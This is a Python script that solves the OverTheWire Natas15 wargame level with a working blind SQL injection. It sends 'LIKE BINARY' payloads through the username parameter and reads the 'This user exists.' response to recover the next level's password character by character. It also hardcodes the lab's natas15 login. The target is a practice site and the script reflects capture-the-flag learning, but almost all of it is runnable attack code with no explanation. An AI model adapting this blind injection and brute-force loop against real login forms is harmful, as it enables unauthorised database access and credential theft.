# Natas15 brute-force script :)
import requests, string, sys, time

# =======================
# === STYLING HELPERS ===
# =======================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def log_info(message):
    print(f"{CYAN}[*] {message}{RESET}")

def log_success(message):
    print(f"{GREEN}[+] {message}{RESET}")

def log_step(message):
    print(f"{YELLOW}[*] {message}{RESET}")

def log_progress_inline(message, color=CYAN):
    sys.stdout.write(f"\r{color}{message}{RESET}")
    sys.stdout.flush()

def log_found_inline(message):
    sys.stdout.write(f"\r{GREEN}{message}{RESET}\n")
    sys.stdout.flush()

def pause_short():
    time.sleep(0.05)
# =======================

# === CONFIG ===
url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
char_data = string.ascii_letters + string.digits
# ==============

password_char_data = []

# ========= Step 1: Build a character dictionary =========
log_info("Building character set...")
for idx, char in enumerate(char_data, 1):
    injection = f'natas16" AND password LIKE BINARY "%{char}%" -- '
    response = requests.get(url, auth=(username, password), params={'username': injection})

    log_progress_inline(f"Testing {idx}/{len(char_data)}: '{char}'")

    if "This user exists." in response.text:
        log_found_inline(f"Found valid character: '{char}'")
        password_char_data.append(char)
        pause_short()

log_success("Character dictionary complete")
print("".join(password_char_data))
# ========================================================


# ========= Step 2: Brute-force the password =========
log_step("Starting brute-force...")
natas16_password = ""

while len(natas16_password) < 32: # natas passwords are 32 chars max
    for char in password_char_data:
        attempt = natas16_password + char
        injection = f'natas16" AND password LIKE BINARY "{attempt}%" -- '
        response = requests.get(url, auth=(username, password), params={'username': injection})

        log_progress_inline(f"Trying: {attempt:<32}")

        if "This user exists." in response.text:
            natas16_password += char
            log_found_inline(f"Password so far: {natas16_password:<32}")
            pause_short()
            break  # restart from first char after finding match

log_success("Password for natas16:")
print(f"{CYAN}{natas16_password}{RESET}")
# =====================================================
